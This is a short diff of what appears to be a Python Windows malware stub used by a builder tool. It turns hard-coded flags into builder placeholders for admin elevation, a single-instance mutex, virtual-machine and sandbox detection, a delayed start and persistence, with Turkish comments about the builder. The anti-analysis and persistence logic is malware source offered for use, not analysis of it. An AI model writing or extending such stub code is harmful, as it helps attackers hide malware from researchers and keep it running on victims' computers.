@@ -15,7 +15,7 @@ def elevate_admin():
     return True
 
 def check_mutex():
-    if True:  # {MUTEX} - Builder bunu True/False ile değiştirecek
+    if {MUTEX}:
         try:
             mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
             if ctypes.windll.kernel32.GetLastError() == 183:
@@ -26,7 +26,7 @@ def check_mutex():
     return None
 
 def check_vm():
-    if True:  # {ANTI_VM} - Builder bunu True/False ile değiştirecek
+    if {ANTI_VM}:
         try:
             vm_indicators = ["VMware", "VirtualBox", "VBox", "VMnet", "VirtIO", "QEMU", "Xen", "Hyper-V"]
             
@@ -70,11 +70,11 @@ def check_sandbox():
         return False
 
 def startup_delay():
-    if True:  # {STARTUP_DELAY} - Builder bunu True/False ile değiştirecek
-        time.sleep(30)  # {DELAY_SECONDS} - Builder bunu sayı ile değiştirecek
+    if {STARTUP_DELAY}:
+        time.sleep({DELAY_SECONDS})
 
 def add_persistence():
-    if True:  # {PERSIST} - Builder bunu True/False ile değiştirecek
+    if {PERSIST}:
         try:
             exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
             
